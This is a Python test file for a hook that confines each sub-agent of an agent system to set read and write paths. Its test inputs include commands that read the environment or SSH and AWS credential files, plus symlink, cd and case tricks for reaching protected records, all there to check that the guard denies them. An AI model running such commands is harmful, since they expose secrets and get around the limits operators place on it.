"""scope-guard.py: per-agent read/write scope for my-agent:* agents (architecture 4.5 "read and write path limits", 4.12)."""
import json
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from helpers import CLAUDE_HOOK_ENV, clean_task_env, make_task, records, rel, run_hook
import ma_active
import ma_logline

TASK = '261025-probe-task'
L4 = Path(__file__).resolve().parents[1] / 'l4-tools-guards'


CANNOT_READ = ('scope-guard: Cannot tell what this command reads (a path built from a variable, command '
               'substitution, cd to a variable, etc.).')


class ScopeGuardTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name).resolve()
        self.L = self.root / 'proj'
        self.T = make_task(self.L, task=TASK)
        (self.L / 'src').mkdir()
        self.env = dict(CLAUDE_HOOK_ENV, MA_DATA_DIR=str(self.root / 'agent-tasks'))

    def tearDown(self):
        self.tmp.cleanup()

    def hook(self, agent, tool, tool_input, cwd=None, session='sess-1', agent_id=None):
        payload = {'hook_event_name': 'PreToolUse', 'tool_name': tool, 'tool_input': tool_input}
        if session is not None:
            payload['session_id'] = session
        if agent_id is None:   # an isolated agent runs in `agent-<its id>` (F19): by default the folder's owner
            name = Path(cwd).name if cwd else ''
            agent_id = name[len('agent-'):] if name.startswith('agent-') else 'a1'
        if agent is not None:
            payload.update(agent_type=agent, agent_id=agent_id)
        return run_hook('scope-guard.py', None, payload, cwd or self.L, env=self.env)

    def denied(self, *a, **kw):
        r = self.hook(*a, **kw)
        self.assertEqual(r.returncode, 0, r.stderr)
        if not r.stdout:
            return False
        out = json.loads(r.stdout)['hookSpecificOutput']
        self.assertEqual((out['hookEventName'], out['permissionDecision']), ('PreToolUse', 'deny'))
        self.assertTrue(out['permissionDecisionReason'])
        return True

    def reason(self, agent, command):
        r = self.hook(agent, 'Bash', {'command': command})
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'] if r.stdout else None

    def guard_lines(self):
        p = self.T / 'run-log.md'
        return [l for l in p.read_text(encoding='utf-8').splitlines() if ' guard: ' in l] if p.exists() else []

    def test_deny_writes_one_guard_line(self):
        r = self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'})
        why = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
        lines = self.guard_lines()
        self.assertEqual(len(lines), 1)
        kind, f = ma_logline.parse_line(lines[0])
        self.assertEqual(kind, 'guard')
        self.assertEqual(f, {'hook': 'scope-guard', 'agent': 'my-agent:coder', 'id': 'a1', 'tool': 'Bash',
                             'decision': 'deny', 'why': why, 'cwd': str(self.L)})

    def test_deny_line_ends_with_input_cwd(self):
        self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'}, cwd=self.L / 'src')
        self.assertTrue(self.guard_lines()[0].endswith(f'cwd={self.L / "src"}'))

    def test_heredoc_with_backticked_word_is_allowed(self):
        bt = chr(96)
        cmd = f"cat > src/notes.md <<'EOF'\nrun {bt}export{bt} first\nEOF"
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}))
        self.assertEqual(self.guard_lines(), [])
        unquoted = "cat > src/notes.md <<EOF\n$(printenv)\nEOF"
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': unquoted}))

    def test_allowed_call_writes_no_guard_line(self):
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'ls src'}))
        self.assertEqual(self.guard_lines(), [])

    def test_no_active_task_gives_no_verdict(self):
        # the guard applies only while a task is active
        other = self.root / 'elsewhere'
        other.mkdir()
        for tool, ti in (('Bash', {'command': 'ls'}), ('Bash', {'command': 'cat /etc/hosts'}),
                         ('Write', {'file_path': str(other / 'x.md'), 'content': 'x'})):
            r = self.hook('my-agent:coder', tool, ti, cwd=other)
            self.assertEqual((r.returncode, r.stdout), (0, ''), r.stderr)
        self.assertEqual(self.guard_lines(), [])

    def test_unwritable_run_log_keeps_the_deny(self):
        want = json.loads(self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'}).stdout)
        (self.T / 'run-log.md').unlink()
        (self.T / 'run-log.md').mkdir()   # a folder: append fails
        r = self.hook('my-agent:coder', 'Bash', {'command': 'cat /etc/hosts'})
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(json.loads(r.stdout), want)

    def test_environment_read_denied_with_exact_reason(self):
        env_cases = [('env', 'env'), ('printenv HOME', 'printenv HOME'),
                     ('cat /proc/self/environ', 'cat /proc/self/environ'), ('ls; set', 'set'),
                     ('timeout 5 env | head', 'timeout 5 env')]
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            for cmd, seg in env_cases:
                with self.subTest(agent=agent, cmd=cmd):
                    self.assertEqual(self.reason(f'my-agent:{agent}', cmd),
                                     f'my-agent scope-guard: {agent} may not read the environment ({seg})')
        self.assertEqual(self.reason('my-agent:coder', 'cat /nonexistent-outside/x'),
                         f'scope-guard: Outside the read scope of coder: {Path("/nonexistent-outside/x").resolve()}')

    def test_environment_commands_with_a_command_pass(self):
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x', 'declare -x VAR=1', 'ls $HOME/x'):
            with self.subTest(cmd=cmd):
                reason = self.reason('my-agent:coder', cmd)
                self.assertNotIn('environment', reason or '')
        for cmd in ('env -i python3 -V', 'set -e', 'export VAR=x'):
            self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': cmd}), cmd)

    def test_environment_read_by_l1_is_silent(self):
        for agent in (None, 'Explore'):
            self.assertFalse(self.denied(agent, 'Bash', {'command': 'printenv'}), agent)

    def test_not_applicable_is_silent(self):
        for agent in (None, 'Explore', 'general-purpose'):
            r = self.hook(agent, 'Read', {'file_path': str(self.root / '.env')})
            self.assertEqual((r.returncode, r.stdout), (0, ''), agent)

    def test_researcher_reads_location_not_outside(self):
        self.assertFalse(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Read', {'file_path': '/Applications/x'}))
        self.assertFalse(self.denied('my-agent:researcher', 'Read', {'file_path': str(self.T / 'work/n.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'background/n.md')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'plan.md')}))
        self.assertFalse(self.denied('my-agent:researcher', 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_researcher_write_roots_follow_approval(self):
        """Before approval the researcher writes only `background/`; after it also `work/` (criterion 6)."""
        w = lambda d: self.hook('my-agent:researcher', 'Write', {'file_path': str(self.T / d / 'n.md')})
        plan = {'file_path': str(self.T / 'plan.md')}
        r = w('work')
        self.assertIn('Outside the write scope of researcher:',
                      json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'])
        self.assertFalse(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / 'background/n.md')}))
        self.assertTrue(self.denied('my-agent:researcher', 'Write', plan))
        (self.T / 'plan.md').write_text('# Plan\n\n## Approval\n\n- Approved 2026-11-24 10:00 G1b\n')
        for d in ('work', 'background'):
            self.assertFalse(self.denied('my-agent:researcher', 'Write', {'file_path': str(self.T / d / 'n.md')}), d)
        self.assertTrue(self.denied('my-agent:researcher', 'Write', plan))

    def test_secret_denied_for_all(self):
        (self.L / '.env').write_text('K=v')
        for agent in ('architect', 'plan-reviewer', 'verifier', 'reviewer', 'explorer', 'coder', 'writer'):
            with self.subTest(agent=agent):
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.L / '.env')}))
        for name in ('.env.local', 'server.pem', 'id.key'):
            self.assertTrue(self.denied('my-agent:coder', 'Read', {'file_path': str(self.L / name)}), name)
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'cat ~/.ssh/id_rsa'}))
        self.assertTrue(self.denied('my-agent:coder', 'Grep', {'pattern': 'x', 'path': str(Path.home() / '.aws')}))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / '.env')}))

    def test_judge_writes_own_file_only(self):
        self.assertFalse(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'verify.md')}))
        self.assertTrue(self.denied('my-agent:verifier', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Write', {'file_path': str(self.T / 'review.md')}))
        self.assertFalse(self.denied('my-agent:architect', 'Write', {'file_path': str(self.T / 'plan.md'), 'content': 'x'}))
        self.assertTrue(self.denied('my-agent:architect', 'Write', {'file_path': str(self.L / 'src/a.py')}))
        self.assertFalse(self.denied('my-agent:plan-reviewer', 'Write', {'file_path': str(self.T / 'plan-review.md')}))
        self.assertFalse(self.denied('my-agent:scope-reviewer', 'Write', {'file_path': str(self.T / 'scope-review.md')}))
        self.assertTrue(self.denied('my-agent:scope-reviewer', 'Write', {'file_path': str(self.T / 'scope.md')}))
        self.assertTrue(self.denied('my-agent:scope-reviewer', 'Edit', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:explorer', 'Write', {'file_path': str(self.T / 'explore.md')}))

    def test_gate_analyst_scope(self):
        a = 'my-agent:gate-analyst'
        (self.T / 'gate-tally.md').write_text('t')
        for name in ('gate-tally.md', 'gate-report.md'):
            self.assertFalse(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertFalse(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-report.md')}))
        for name in ('plan.md', 'run-log.md', 'intake.md', 'work/x.md'):
            self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.T / name)}), name)
        self.assertTrue(self.denied(a, 'Read', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'gate-tally.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.T / 'work/x.md')}))
        self.assertTrue(self.denied(a, 'Write', {'file_path': str(self.root / 'outside' / 'x.md')}))
        self.assertTrue(self.denied(a, 'Bash', {'command': 'echo x > gate-report.md'}))
        self.assertTrue(self.denied(a, 'WebFetch', {'url': 'https://e.com', 'prompt': 'x'}))

    def test_judge_bash_is_read_only(self):
        self.assertTrue(self.denied('my-agent:reviewer', 'Bash', {'command': "sed -i '' s/a/b/ src/x"}))
        self.assertTrue(self.denied('my-agent:verifier', 'Bash', {'command': 'git stash'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'ls > out.txt'}))
        self.assertFalse(self.denied('my-agent:verifier', 'Bash', {'command': 'python3 -m unittest 2>&1 | tail -5'}))
        self.assertFalse(self.denied('my-agent:reviewer', 'Bash', {'command': 'git diff && git status --porcelain'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': 'grep -rn foo src/'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Bash', {'command': 'cat /etc/hosts'}))

    def test_reads_stay_in_location(self):
        self.assertFalse(self.denied('my-agent:explorer', 'Glob', {'pattern': '**/*.py'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x'}))
        self.assertTrue(self.denied('my-agent:explorer', 'Grep', {'pattern': 'x', 'path': str(self.root)}))
        self.assertTrue(self.denied('my-agent:architect', 'Read', {'file_path': '/etc/hosts'}))
        self.assertTrue(self.denied('my-agent:architect', 'Glob', {'pattern': '/etc/*'}))

    def test_writer_reference_files(self):
        ref = self.L / 'docs' / 'ref.md'
        ref.parent.mkdir(exist_ok=True)
        ref.write_text('r')
        self.assertTrue(self.denied('my-agent:writer', 'Read', {'file_path': '/Applications/x'}))
        (self.T / 'plan.md').write_text('# Plan\n\n## Reference files\n\n- `docs/ref.md`\n\n## Approval\n')
        self.assertFalse(self.denied('my-agent:writer', 'Read', {'file_path': str(ref)}))
        self.assertFalse(self.denied('my-agent:writer', 'Write', {'file_path': str(self.T / 'prototype/index.html')}))
        self.assertTrue(self.denied('my-agent:writer', 'Write', {'file_path': str(ref)}))

    def test_writer_gate_report_paths(self):
        """The writer writes `<T>/report/` and the single file `<T>/report-ko.json` (criterion 4)."""
        w = lambda f: self.denied('my-agent:writer', 'Write', {'file_path': str(self.T / f)})  # noqa: E731
        self.assertFalse(w('report/G3.md'))
        self.assertFalse(w('report-ko.json'))
        for f in ('scope.md', 'report-ko.json.bak', 'verify.md'):
            self.assertTrue(w(f), f)

    def test_blueprint_folder_is_the_writers(self):
        """4.7.5: only the writer writes `docs/blueprint/`; the coder, whose scope is the location, does not."""
        page = self.L / 'docs' / 'blueprint' / 'features.md'
        self.assertFalse(self.denied('my-agent:writer', 'Write', {'file_path': str(page)}))
        self.assertFalse(self.denied('my-agent:writer', 'Edit', {'file_path': str(page), 'old_string': 'a',
                                                                 'new_string': 'b'}))
        self.assertTrue(self.denied('my-agent:writer', 'Write', {'file_path': str(self.L / 'docs' / 'other.md')}))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(page)}))
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / 'docs' / 'other.md')}))
        for agent in ('researcher', 'explorer', 'verifier', 'reviewer'):
            self.assertTrue(self.denied(f'my-agent:{agent}', 'Write', {'file_path': str(page)}), agent)
            self.assertFalse(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(page)}), agent)

    def test_no_blueprint_when_the_location_is_the_data_folder(self):
        """A task outside any project (location = data folder) keeps no blueprint: the writer gets no extra root."""
        data = self.root / 'agent-tasks'
        T = make_task(data, task=TASK, git=False)
        page = data / 'docs' / 'blueprint' / 'features.md'
        self.assertTrue(self.denied('my-agent:writer', 'Write', {'file_path': str(page)}, cwd=data))
        self.assertFalse(self.denied('my-agent:writer', 'Write', {'file_path': str(T / 'work' / 'n.md')}, cwd=data))

    def scratch(self, sid='sess-1', slug='x-slug'):
        return Path('/tmp').resolve() / f'claude-{os.getuid()}' / slug / sid / 'scratchpad' / 'n.txt'

    def test_session_command_output_is_readable(self):
        """The output files of the session's own commands (`tasks/`, `tool-results/`) are read roots; the session
        record and another session's files are not."""
        tasks = self.scratch().parent.parent / 'tasks' / 'b1.output'
        projects = self.root / 'claude-projects'
        results = projects / 'x-slug' / 'sess-1' / 'tool-results' / 'b1.txt'
        self.env = {**(self.env or {}), 'MA_CLAUDE_PROJECTS': str(projects)}
        for agent in ('coder', 'verifier', 'reviewer'):
            for tool, ti in (('Read', {'file_path': str(tasks)}), ('Bash', {'command': f'tail -5 {tasks}'}),
                             ('Read', {'file_path': str(results)}), ('Grep', {'pattern': 'x', 'path': str(results)})):
                with self.subTest(agent=agent, tool=tool):
                    self.assertFalse(self.denied(f'my-agent:{agent}', tool, ti))
            for path in (projects / 'x-slug' / 'sess-1.jsonl', projects / 'x-slug' / 'other' / 'tool-results' / 'b.txt',
                         self.scratch('other-id').parent.parent / 'tasks' / 'b.output'):
                with self.subTest(agent=agent, path=str(path)):
                    self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(path)}))
        self.assertTrue(self.denied('my-agent:gate-analyst', 'Read', {'file_path': str(results)}))

    def test_read_roots(self):
        outside = self.root / 'outside'
        outside.mkdir()
        (self.T / 'plan.md').write_text(f'# Plan\n\n## Reference files\n\n- `{outside / "ref.md"}`\n\n## Approval\n')
        plugin = Path(__file__).resolve().parents[1]
        data = self.root / 'agent-tasks'
        ok = [data / 'feedback.md', plugin / 'SKILL.md', self.scratch(), outside / 'ref.md', self.L / 'src' / 'a.py']
        for agent in ('explorer', 'architect', 'plan-reviewer', 'verifier', 'reviewer', 'coder', 'writer',
                      'researcher'):
            for path in ok:
                with self.subTest(agent=agent, path=str(path)):
                    self.assertFalse(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(path)}))
            with self.subTest(agent=agent, case='denied'):
                for path in ('/Applications/x', self.scratch('other-id')):
                    r = self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(path)})
                    reason = json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason']
                    self.assertEqual(reason, f'scope-guard: Outside the read scope of {agent}: {Path(path).resolve()}')
                for sid in (None, ''):
                    r = self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(self.scratch())}, session=sid)
                    self.assertIn('Outside the read scope', json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'])
                self.assertTrue(self.denied(f'my-agent:{agent}', 'Read', {'file_path': str(self.scratch('..'))}))

    def test_gate_analyst_keeps_two_files(self):
        a = 'my-agent:gate-analyst'
        plugin = Path(__file__).resolve().parents[1]
        for path in (self.root / 'agent-tasks' / 'feedback.md', plugin / 'SKILL.md', self.scratch(),
                     self.L / 'src' / 'a.py'):
            self.assertTrue(self.denied(a, 'Read', {'file_path': str(path)}), str(path))

    def test_reference_secret_still_denied(self):
        outside = self.root / 'outside'
        outside.mkdir()
        (self.T / 'plan.md').write_text(f'# Plan\n\n## Reference files\n\n- `~/.ssh/id_rsa`\n- `{outside / ".env"}`\n')
        for agent in ('researcher', 'writer', 'coder', 'explorer'):
            for path in (Path.home() / '.ssh' / 'id_rsa', outside / '.env'):
                reason = json.loads(self.hook(f'my-agent:{agent}', 'Read', {'file_path': str(path)}).stdout)
                self.assertEqual(reason['hookSpecificOutput']['permissionDecisionReason'],
                                 f'scope-guard: Secret paths are not read or written: {path}')
            self.assertEqual(self.reason(f'my-agent:{agent}', 'printenv'),
                             f'my-agent scope-guard: {agent} may not read the environment (printenv)')

    def test_explorer_bash_reads_data_folder(self):
        data = self.root / 'agent-tasks'
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': f'grep -rn x {data}'}))
        self.assertFalse(self.denied('my-agent:explorer', 'Bash', {'command': f'cat {data / "feedback.md"}'}))

    def test_environment_read_in_substitutions_and_wrappers(self):
        cases = [('echo $(printenv)', 'printenv'), ('echo "$(env)"', 'env'), ('printenv $(date)', 'printenv $(date)'),
                 ('setsid env', 'setsid env'), ('python3 -c "import os;print(os.environ)"',
                                                'python3 -c import os;print(os.environ)'),
                 ('python3 -c "from os import environ; print(environ)"',
                  'python3 -c from os import environ; print(environ)'),
                 ('echo $(printenv HOME)', 'printenv HOME')]
        for cmd, seg in cases:
            with self.subTest(cmd=cmd):
                self.assertEqual(self.reason('my-agent:coder', cmd),
                                 f'my-agent scope-guard: coder may not read the environment ({seg})')
        self.assertEqual(self.reason('my-agent:coder', 'echo $(date)'), CANNOT_READ)
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'python3 -c "print(1)"'}))

    def test_literal_variable_paths(self):
        coder, L = 'my-agent:coder', self.L
        (L / 'a').mkdir()
        (L / 'a' / 'b').write_text('x')
        self.assertFalse(self.denied(coder, 'Bash', {'command': f'P={L}/a; cat $P/b'}))
        self.assertEqual(self.reason(coder, 'P=/etc; cat $P/hosts'),
                         f'scope-guard: Outside the read scope of coder: {Path("/etc/hosts").resolve()}')
        ssh = Path.home() / '.ssh'
        self.assertEqual(self.reason(coder, f'P={ssh}; cat $P/id_rsa'),
                         f'scope-guard: Secret paths are not read or written: {(ssh / "id_rsa").resolve()}')
        for cmd in (f'false && P={L}/a; cat $P/etc/passwd', f'P={L}/a; P=/etc; cat $P/passwd'):
            with self.subTest(cmd=cmd):
                self.assertEqual(self.reason(coder, cmd), CANNOT_READ)

    def test_relative_and_cd_reads(self):
        ex ='my-agent:explorer'
        (self.L / 'README.md').write_text('r')
        self.assertFalse(self.denied(ex, 'Bash', {'command': 'cat ../README.md'}, cwd=self.L / 'src'))
        self.assertFalse(self.denied(ex, 'Bash', {'command': 'cd src && cat ../README.md'}))
        self.assertEqual(self.reason(ex, 'cat ../../outside.txt'),
                         f'scope-guard: Outside the read scope of explorer: {(self.L.parent.parent / "outside.txt")}')
        for cmd in ('cat $D/x', 'cd "$D" && cat x'):
            self.assertEqual(self.reason(ex, cmd), 'scope-guard: Cannot tell what this command reads (a path built from a variable, command substitution, cd to a variable, etc.).')

    def test_coder_in_worktree_of_linked_location(self):
        main = self.root / 'main'
        common = main / '.git'
        for n in ('loc', 'agent-x'):
            (common / 'worktrees' / n).mkdir(parents=True)
            (common / 'worktrees' / n / 'commondir').write_text('../..\n')
        loc = self.root / 'loc'
        T = make_task(loc, task=TASK, git=False)
        (loc / '.git').write_text(f'gitdir: {common / "worktrees" / "loc"}\n')
        W = loc / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f'gitdir: {common / "worktrees" / "agent-x"}\n')
        c = 'my-agent:coder'
        self.assertFalse(self.denied(c, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}, cwd=W))
        self.assertFalse(self.denied(c, 'Read', {'file_path': str(W / 'src/a.py')}, cwd=W))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(W / '.git/x'), 'content': 'x'}, cwd=W))

    def test_coder_worktree_writes(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'src/a.py')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'touch src/b.py'}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / 'src/a.py')}, cwd=W))
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(records(self.L) / 'x/y')}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Read', {'file_path': str(self.T / 'plan.md')}, cwd=W))

    def test_main_tree_coder_in_a_session_moved_to_another_agents_worktree(self):
        """The session's folder is the worktree of another coder (`agent-x`); a coder called without isolation
        inherits that `cwd` but is a main-tree coder: it writes the task location, not that worktree."""
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        (W / 'src').mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        c, other = 'my-agent:coder', dict(cwd=W, agent_id='y')
        self.assertFalse(self.denied(c, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}, **other))
        self.assertFalse(self.denied(c, 'Bash', {'command': f'touch {self.L}/src/b.py'}, **other))
        self.assertFalse(self.denied(c, 'Read', {'file_path': str(self.L / 'src/a.py')}, **other))
        # a relative path still resolves against the real folder, which is not this coder's
        self.assertTrue(self.denied(c, 'Bash', {'command': 'touch src/b.py'}, **other))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}, **other))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(self.T / 'plan.md'), 'content': 'x'}, **other))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(self.L / '.git/config'), 'content': 'x'}, **other))
        # no agent id at all: not the owner either
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}, cwd=W, agent_id=''))
        # the owner keeps its worktree and stays out of the main tree
        self.assertFalse(self.denied(c, 'Write', {'file_path': str(W / 'src/a.py'), 'content': 'x'}, cwd=W))
        self.assertTrue(self.denied(c, 'Write', {'file_path': str(self.L / 'src/a.py'), 'content': 'x'}, cwd=W))

    def test_coder_main_tree(self):
        self.assertFalse(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.L / 'src/a.py')}))
        self.assertTrue(self.denied('my-agent:coder', 'Edit', {'file_path': str(self.T / 'plan.md')}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': f'rm -rf {rel()}'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'echo x > "$OUT"'}))
        self.assertFalse(self.denied('my-agent:coder', 'Bash', {'command': 'python3 -m unittest'}))

    def test_coder_cannot_reach_records_by_case_cd_or_link(self):
        for raw in (rel().upper(), rel().swapcase()):
            with self.subTest(raw=raw):
                self.assertTrue(self.denied('my-agent:coder', 'Write',
                                            {'file_path': str(self.L / raw / TASK / 'review.md'), 'content': 'x'}))
        head, _, tail = rel().rpartition('/')
        cd = f'cd {head} && echo "BLOCKER 0" > {tail}/{TASK}/review.md' if head else \
            f'cd {tail} && echo "BLOCKER 0" > {TASK}/review.md'
        for cmd in (cd,
                    f'ln -s {rel()}/{TASK} x && echo "BLOCKER 0" > x/review.md',
                    f'rm {rel()}/.ACTIVE'):
            with self.subTest(cmd=cmd):
                self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': cmd}))

    def test_coder_cannot_write_git_or_claude_config(self):
        for rel in ('.git/hooks/pre-commit', '.git/config', '.claude/settings.json',
                    '.claude/worktrees/agent-other/src/a.py'):
            with self.subTest(rel=rel):
                self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(self.L / rel), 'content': 'x'}))
        self.assertTrue(self.denied('my-agent:coder', 'Bash', {'command': 'ln -s "$HOME/.zshrc" z && echo e >> z'}))

    def test_worktree_coder_cannot_write_its_git_file(self):
        (self.L / '.git' / 'worktrees' / 'agent-x').mkdir(parents=True)
        W = self.L / '.claude' / 'worktrees' / 'agent-x'
        W.mkdir(parents=True)
        (W / '.git').write_text(f"gitdir: {self.L / '.git' / 'worktrees' / 'agent-x'}\n")
        self.assertTrue(self.denied('my-agent:coder', 'Write', {'file_path': str(W / '.git'), 'content': 'x'}, cwd=W))
        self.assertFalse(self.denied('my-agent:coder', 'Write', {'file_path': str(W / 'a.py'), 'content': 'x'}, cwd=W))

    def test_architect_cannot_add_approval_or_prototype(self):
        plan = self.T / 'plan.md'
        plan.write_text('# Plan\n\n## Prototype\n\nneeded\n\n## Approval\n')
        write = lambda content: self.denied('my-agent:architect', 'Write',  # noqa: E731
                                            {'file_path': str(plan), 'content': content})
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n\n- Approved 2026-10-25 10:00 G1b\n'))
        self.assertTrue(write('# Plan v2\n\n## Prototype\n\nneeded\nPrototype: requested\n\n## Approval\n'))
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        # outside ## Prototype the line opens nothing (A5), so it is not L1's marker either
        self.assertFalse(write('# Plan v2\n\nPrototype: requested\n\n## Prototype\n\nneeded\n\n## Approval\n'))
        plan.write_text('# Plan\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n')
        self.assertFalse(write('# Plan v2\n\n## Prototype\n\nPrototype: requested\n\n## Approval\n'))
        self.assertEqual(self.why('my-agent:architect', 'Edit',
                                  {'file_path': str(plan), 'old_string': '## Approval\n',
                                   'new_string': '## Approval\n- Approved 2026-10-25 10:00 G1b\n'}),
                         'scope-guard: Only L1 writes the approval line of plan.md (G1-B).')
        plan.write_text('# Plan\n\n## Prototype\n\nneeded\n\n## Approval\n')
        self.assertEqual(self.why('my-agent:architect', 'Edit',
                                  {'file_path': str(plan), 'old_string': 'needed\n',
                                   'new_string': 'needed\nPrototype: requested\n'}),
                         'scope-guard: Only L1 writes the `Prototype: requested` line of plan.md (G1-B).')

    def why(self, agent, tool, tool_input, **kw):
        """The deny reason of a call, or None when it passes."""
        r = self.hook(agent, tool, tool_input, **kw)
        self.assertEqual(r.returncode, 0, r.stderr)
        return json.loads(r.stdout)['hookSpecificOutput']['permissionDecisionReason'] if r.stdout else None

    def edit(self, old, new, path=None, agent='my-agent:architect', **extra):
        return self.why(agent, 'Edit', dict({'file_path': str(path or self.T / 'plan.md'), 'old_string': old,
                                             'new_string': new}, **extra))

    PLAN = '# Plan\n\n## Work units\n\n- Status: pending\n- Status: pending\n\n## Approval\n\n'

    def test_architect_edit_own_plan_only(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertIsNone(self.edit('## Work units', '## Work units\n'))
        src, scope = self.L / 'src' / 'a.py', self.T / 'scope.md'
        src.write_text('x\n')
        scope.write_text('x\n')
        for p in (src, scope):
            with self.subTest(path=p.name):
                self.assertIn('Outside the write scope of architect', self.edit('x', 'y', path=p))

    def test_architect_edit_text_not_in_plan(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertEqual(self.edit('## Work units:', '## Work units'),
                         'scope-guard: Cannot work out plan.md after this change (the text to replace is not in plan.md '
                         'exactly as given). Give the exact text to replace, or write the whole file with Write.')

    def test_architect_edit_missing_plan(self):
        self.assertFalse((self.T / 'plan.md').exists())
        self.assertIn('not in plan.md exactly as given', self.edit('## Work units', 'x'))

    def test_architect_edit_empty_old(self):
        want = ('scope-guard: Cannot work out plan.md after this change (the text to replace is empty). '
                'Give the exact text to replace, or write the whole file with Write.')
        self.assertEqual(self.edit('', 'x'), want)
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertEqual(self.edit('', 'x'), want)

    def test_architect_edit_ambiguous(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertEqual(self.edit('- Status: pending', '- Status: done'),
                         'scope-guard: Cannot work out plan.md after this change (the text to replace is in plan.md 2 '
                         'times). Give a longer text that occurs once, or write the whole file with Write.')

    def test_architect_edit_no_text_shape(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        why = self.why('my-agent:architect', 'Edit', {'file_path': str(self.T / 'plan.md')})
        self.assertEqual(why, 'scope-guard: Cannot work out plan.md after this change (no text to replace reaches the '
                              'guard). Change one exact text with Edit, or write the whole file with Write.')
        self.assertEqual(self.why('my-agent:architect', 'Edit', {'file_path': str(self.T / 'plan.md'),
                                                                 'old_string': 'x', 'new_string': None}), why)

    def test_architect_edit_same_text_allowed(self):
        (self.T / 'plan.md').write_text(self.PLAN)
        self.assertIsNone(self.edit('## Work units', '## Work units'))

